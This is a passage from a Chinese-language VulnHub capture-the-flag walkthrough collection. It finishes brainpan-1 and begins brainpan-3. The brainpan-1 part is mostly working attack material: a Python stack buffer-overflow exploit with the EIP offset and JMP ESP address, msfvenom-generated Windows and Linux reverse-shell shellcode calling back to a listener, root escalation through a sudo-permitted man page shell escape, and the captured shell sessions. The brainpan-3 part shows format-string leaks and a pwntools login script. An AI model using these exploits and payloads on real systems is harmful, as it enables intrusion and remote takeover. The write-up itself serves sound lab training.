[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B(_]
[get_reply] copied 1003 bytes to buffer
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg)

再次成功地覆盖了eip。记下指令指针地址35724134，将其推入Metasploit的模式偏移工具中，这将提供为控制eip而需要发送到缓冲区的字节数。

``` bash
root@kali:~/vulnhub/brainpan1# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```

知道只需要524字节的“垃圾数据”就可以成为eip。相应地编辑模糊测试器，看看是否可以用某些B（\x42）成功覆盖eip。重新运行，重新连接并启动模糊测试器。


![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg)

瞧！如所见，已成功用4个字节的B覆盖了eip。下一个是什么？接下来，看看是否可以将自己的代码放入esp中。如果可以将代码放入esp，将查找名为jmp esp的函数调用，告诉eip指向esp，从而能够执行存储在esp中的恶意代码。编辑模糊器，使其在esp中包含一堆C（\x43），并查看是否有足够的空间容纳潜在的Shellcode。

``` bash
import sys,socket
 
victim = '192.168.43.98'
port = 9999
 
junk = "\x41" * 524
eip = "\x42" * 4
shellcode = "\x43" * 500
 
payload = junk + eip + shellcode
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg)

正如上面看到的，已经成功地用大量C填充了esp，这使知道有一些可用于放置shellcode的区域。让看看是否可以找到jmp esp函数的地址。在Immunity Debugger中，使用ctrl-f并输入搜索jmp esp。如所见，第一个jmp esp地址是311712F3。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg)

下一步，生成一些shellcode，以测试概念验证（PoC）是否有效。由于要测试的PoC框是一个windoZe机器，因此将使用msfvenom生成一个简单的Windows reverse shell。

``` bash
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/shikata_ga_nai -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68"
buf += b"\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39"
buf += b"\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8"
buf += b"\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66"
buf += b"\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c"
buf += b"\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f"
buf += b"\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8"
buf += b"\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54"
buf += b"\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a"
buf += b"\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92"
buf += b"\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30"
buf += b"\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a"
buf += b"\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25"
buf += b"\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b"
buf += b"\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1"
buf += b"\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3"
buf += b"\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4"
buf += b"\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86"
buf += b"\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c"
buf += b"\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b"
buf += b"\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46"
buf += b"\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84"
buf += b"\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad"
buf += b"\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec"
buf += b"\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe"
buf += b"\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79"
```

接下来，让把它们放在一起,payload将如下所示：{junk} {jmp esp地址} {nops + buf}

``` bash
import sys,socket
 
victim = '192.168.43.98'
port = 9999
 
junk = "\x41" * 524
eip = "\xf3\x12\x17\x31"
buf =  b"\x90" * 13
buf += b"\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68"
buf += b"\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39"
buf += b"\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8"
buf += b"\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66"
buf += b"\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c"
buf += b"\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f"
buf += b"\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8"
buf += b"\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54"
buf += b"\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a"
buf += b"\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92"
buf += b"\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30"
buf += b"\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a"
buf += b"\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25"
buf += b"\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b"
buf += b"\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1"
buf += b"\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3"
buf += b"\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4"
buf += b"\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86"
buf += b"\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c"
buf += b"\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b"
buf += b"\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46"
buf += b"\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84"
buf += b"\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad"
buf += b"\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec"
buf += b"\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe"
buf += b"\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79"
 
payload = junk + eip + buf
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
```

启动brainpan.exe程序，在端口443上创建netcat侦听器，然后测试一下PoC代码。

``` bash
C:\Users\HASEE\Desktop\brainpan1>python etfuzz.py
[-] Connecting to 192.168.43.98
[-] Sending payload....  Done
```

``` bash
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.56.1: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.1] 18602
Microsoft Windows [�汾 10.0.18363.592]
(c) 2019 Microsoft Corporation����������Ȩ����

C:\Users\HASEE\Desktop\brainpan1>chcp 65001
chcp 65001
Active code page: 65001

C:\Users\HASEE\Desktop\brainpan1>whoami  
whoami
iz94tylsq69z\hasee

C:\Users\HASEE\Desktop\brainpan1>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7A49-F084

 Directory of C:\Users\HASEE\Desktop\brainpan1

2020/02/01  01:21    <DIR>          .
2020/02/01  01:21    <DIR>          ..
2020/01/31  20:48            21,190 brainpan.exe
2020/02/01  01:21             2,166 etfuzz.py
               2 File(s)         23,356 bytes
               2 Dir(s)  151,135,014,912 bytes free

C:\Users\HASEE\Desktop\brainpan1>net user
net user

User accounts for \\IZ94TYLSQ69Z

-------------------------------------------------------------------------------
Administrator            ASPNET                   DefaultAccount           
Guest                    HASEE                    WDAGUtilityAccount 
```

 - 注意：这个shell是测试电脑的shell，如果乱码，输入chcp 65001就不会乱码了

#### getshell

好东西…。现在有一个reverse TCP连接到我们的Windows计算机。是时候创建一个Linux reverse shell了。

``` bash
root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/alpha_upper -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 205 (iteration=0)
x86/alpha_upper chosen with final size 205
Payload size: 205 bytes
Final size of python file: 1007 bytes
buf =  b""
buf += b"\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += b"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += b"\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += b"\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += b"\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47"
buf += b"\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30"
buf += b"\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37"
buf += b"\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38"
buf += b"\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33"
buf += b"\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46"
buf += b"\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b"
buf += b"\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f"
buf += b"\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53"
buf += b"\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31"
buf += b"\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41"
```

``` bash
import sys,socket
 
victim = '192.168.56.115'
port = 9999
 
junk = "\x41" * 524
eip = "\xf3\x12\x17\x31"
buf =  b"\x90" * 13
buf += b"\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += b"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += b"\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += b"\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += b"\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47"
buf += b"\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30"
buf += b"\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37"
buf += b"\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38"
buf += b"\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33"
buf += b"\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46"
buf += b"\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b"
buf += b"\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f"
buf += b"\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53"
buf += b"\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31"
buf += b"\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41"
 
payload = junk + eip + buf
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
```

使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。

``` bash
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.56.115: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
python -c 'import pty; pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ id
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
puck@brainpan:/home/puck$ whoami
whoami
puck
puck@brainpan:/home/puck$ ls
ls
checksrv.sh  web
puck@brainpan:/home/puck$
```

#### 提权

成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？

``` bash
puck@brainpan:/home$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

anansi_util NOPASSWD？很有趣。仔细看看。

``` bash
puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

- manual [command]部分。看看是否可以使用root特权运行[command]。

成功的提权并找到了flag，吊炸天！！！

``` bash
puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash
sudo /home/anansi/bin/anansi_util manual /bin/bash
/usr/bin/man: manual-/bin/bash: No such file or directory
/usr/bin/man: manual_/bin/bash: No such file or directory
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
BASH(1)                                                                BASH(1)

NAME
       bash - GNU Bourne-Again SHell

SYNOPSIS
       bash [options] [file]

COPYRIGHT
       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.

DESCRIPTION
       Bash  is  an  sh-compatible  command language interpreter that executes
       commands read from the standard input or from a file.  Bash also incor‐
       porates useful features from the Korn and C shells (ksh and csh).

       Bash  is  intended  to  be a conformant implementation of the Shell and
       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard
       1003.1).  Bash can be configured to be POSIX-conformant by default.

OPTIONS
       All  of  the  single-character shell options documented in the descrip‐
       tion of the set builtin command can be used as options when  the  shell
 Manual page bash(1) line 1 (press h for help or q to quit)!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man# id
id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/usr/share/man# whoami
whoami
root
root@brainpan:/usr/share/man# cd /root
cd /root
root@brainpan:~# ls
ls
b.txt
root@brainpan:~# cat b.txt
cat b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~#
```

W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！/bin/bash。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg)

#### 知识点总结

 - 缓冲区溢出
 - od调试程序
 - python模糊测试脚本测试段错误
 - msf脚本生成填充缓冲区的字节
 - msfvenom生成reverse shell的python shellcode版本的代码
 - 覆盖eip将恶意shellcode代码放入esp取得reverseshell
 - man内置功能内联运行命令提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end brainpan-1 -->

</details>

<a id="case-brainpan-3"></a>

## 多个二进制之间的输入边界

原文两种方法覆盖 report、cryptor 与消息结构的不同内存缺陷。函数指针覆盖、格式化字符串、命令注入和 gadget 搜索深度作为独立分支保留。

<p class="kb-provenance">来源 brainpan-3 · 原记录 2020-02-03 · 134 个代码块 · 15 处图片引用</p>

<details class="kb-evidence" id="record-brainpan-3">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start brainpan-3 -->

#### 名称
名称：brainpan: 3
发行日期：2015年7月27日

#### 难度

 - 万劫不复地狱难度

#### 下载

 - Download (Mirror): https://download.vulnhub.com/brainpan/brainpan3.zip
 - Download (Torrent): https://download.vulnhub.com/brainpan/brainpan3.zip.torrent

#### 描述

免责声明
使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。

设定
Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。
检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：

``` bash
MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5
```

将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。

目标
root机器并获取flag。

 - barrebas : https://twitter.com/barrebas
 - Swappage : https://twitter.com/Swappage



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.117
Host is up (0.00020s latency).
MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)

root@kali:~# nmap -v -sV -Pn -p- 192.168.56.117 --system-dns
PORT     STATE  SERVICE    VERSION
1337/tcp open   waste?
8080/tcp closed http-proxy
```

#### 方法一

找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：

bp3.py
``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)

r.interactive()
```

即使文字说

``` bash
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。

一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Switching to interactive mode


  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: $ %x.%x.%x.%x.%x.
ERROR #4: WHAT IS THIS, AMATEUR HOUR?

FAILED LOGIN ATTEMPTS: 1

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

Herm ..是否在％x上进行过滤？尝试其他格式的字符串。

``` bash
ACCESS CODE: $ %p.%p.%p.%p.
ERROR #1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 2

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。

``` bash
ACCESS CODE: $ %d.%d.%d.%d.%d.%d.
ERROR #1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 3

BRUTE-FORCE ATTEMPT DETECTED
PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

啊!这里的第三个数是什么：4625,尝试一下访问代码：

``` bash
ACCESS CODE: $ 4625

--------------------------------------------------------------
SESSION: ID-7034
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

进来了！在继续进行之前，修改脚本以自动跳过访问代码：

 - 发送%d.%d.%d.%d.%d.%d
 - 提取第三个元素（访问代码）
 - 提交访问代码以进行登录

从这里开始，将继续向脚本中添加代码片段,结果如下：

``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.interactive()
```

运行
``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 8695
[*] Switching to interactive mode

--------------------------------------------------------------
SESSION: ID-4373
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: $
```

#### 第二步

现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：

``` bash
ENTER COMMAND: $ 4
SELECTED: 4
reynard@brainpan3 $ $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
```

当然，可以尝试溢出此shell脚本/二进制文件：

``` bash
reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: ./shell terminated
Aborted (core dumped)
```

经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：

``` bash
ENTER COMMAND: $ 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD

SELECTED: 2

CODE REPOSITORY IS NOW AVAILABLE
```

看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？

打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：

![](http://ctfhacker.com/assets/images/repo-directory.png)

花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。

尚未查看的最后一个功能是“Update Session Name”功能：

``` bash
ENTER COMMAND: $ 3
SELECTED: 3
ENTER NEW SESSION NAME: $ fuckfuckfuckfuck
--------------------------------------------------------------
SESSION: fuckfuckfuckfuck
```

有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？

``` bash
ENTER COMMAND: $ 3
SELECTED: 3
ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.
--------------------------------------------------------------
SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.
```

